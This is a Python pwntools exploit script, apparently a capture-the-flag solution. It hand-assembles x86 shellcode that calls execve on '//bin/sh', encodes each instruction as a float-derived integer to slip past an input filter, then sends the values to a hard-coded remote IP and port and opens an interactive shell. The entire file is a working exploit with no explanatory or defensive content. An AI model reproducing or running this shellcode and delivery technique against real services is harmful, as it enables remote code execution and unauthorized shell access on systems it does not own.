import struct
import ctypes
from pwn import *

shellcode = ["\x31\xc9", # xor ecx, ecx
             "\xf7\xe1", # mul ecx
             "\x51", # push ecx
             "\xb1\xff", # mov cl, 0xFF
             "\xb5\xff", # mov ch, 0xFF
             "\x41", # inc ecx
             "\xb4\x68", # mov ah, 0x68
             "\xb0\x73", # mov al, 0x73
             "\xf7\xe1", # mul ecx
             "\xb4\x2f", # mov ah, 0x2F
             "\xb0\x2f", # mov al, 0x2F
             "\x50", # push eax
             "\xb4\x6e", # mov ah, 0x6e
             "\xb0\x69", # mov al, 0x69
             "\xf7\xe1", # mul ecx
             "\xb4\x62", # mov ah, 0x62
             "\xb0\x2f", # mov al, 0x2F
             "\x50", # push eax
             "\x31\xc0", # xor eax, eax
             "\x31\xd2", # xor edx, edx
             "\x31\xc9", # xor ecx, ecx
             "\x89\xe3", # mov ebx, esp
             "\xb0\x0b", # mov al, 11
             "\xcd\x80"] # int 0x80

ints_to_send = []

for instr in shellcode:
    z = "\x40"
    if len(instr) == 1:
        z = "\x90\x40"
    payload = "\x48" + instr[::-1] + z
    a = struct.unpack(">f", payload)[0]*2333
    if a > 2147483647:
        log.error("It's too large fam.")

    b = str("{0:f}".format(a)).split(".")[0]

    log.info(b + " " + payload.encode("hex"))
    ints_to_send.append(b)

r = remote("106.75.84.68", 20000)
for i in ints_to_send:
    r.sendline(i)

r.interactive()
